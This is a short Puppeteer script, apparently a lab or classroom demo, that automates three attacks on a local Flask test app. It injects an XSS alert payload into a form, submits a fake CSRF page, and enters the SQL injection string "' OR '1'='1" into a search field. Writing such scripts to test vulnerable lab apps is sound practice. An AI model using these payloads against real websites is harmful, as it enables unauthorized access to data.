const puppeteer = require('puppeteer');

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

(async () => {
  const browser = await puppeteer.launch({ headless: false, slowMo: 50, });
  const page = await browser.newPage();

  // 1. XSS Napad
  await page.goto('http://localhost:5000/xss');
  await page.type('input[name="user_input"]', '<script>alert("XSS attack successful!");</script>');
  await page.click('input[type="submit"]');
  
  await sleep(1000);
  // 2. CSRF Napad
  await page.goto('file:///home/coda/Desktop/flaskapp/csrf_fake_site.html');
  await sleep(1000);
  await page.click('button[type="submit"]');
 
  await sleep(3000);

  // 3. SQL Injection Napad
  await page.goto('http://localhost:5000/search');
  await page.type('input[name="address"]', "' OR '1'='1");
  await page.click('input[type="submit"]');
  await sleep(3000);
  await browser.close();



})();

